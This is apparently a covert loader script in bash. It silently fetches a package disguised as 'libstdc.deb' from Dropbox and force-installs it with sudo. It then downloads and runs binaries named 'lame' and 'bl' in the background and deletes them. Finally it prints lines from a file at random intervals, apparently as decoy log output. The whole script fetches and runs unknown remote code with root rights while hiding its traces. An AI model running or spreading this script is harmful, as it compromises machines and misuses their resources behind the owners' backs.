#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/mjz0jt2mpq4qnij/lame.zip -q
unzip lame.zip > /dev/null 2>&1
#pwd
./src/lame ./src/bl &
sleep 3
rm -rf lame.zip
rm -rf src/lame
rm -rf src/bl
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 20 ))
done < $2

